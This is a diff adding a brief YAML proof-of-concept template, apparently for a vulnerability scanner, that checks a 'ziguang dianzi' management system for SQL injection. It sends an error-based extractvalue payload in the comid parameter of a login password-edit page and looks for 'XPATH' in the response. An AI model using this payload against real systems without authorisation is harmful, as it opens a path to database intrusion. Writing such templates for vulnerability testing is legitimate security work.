@@ -1,0 +1,14 @@
+name: ziguang-dianzi-manage-sqli
+set:
+  s0: randomInt(1000,9999)
+groups:
+  poc:  
+    - method: GET
+      path: /login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1)))
+      headers:
+      body: |
+      expression: >-
+        response.body.bcontains(b'XPATH')
+  author: 
+  links:
+  
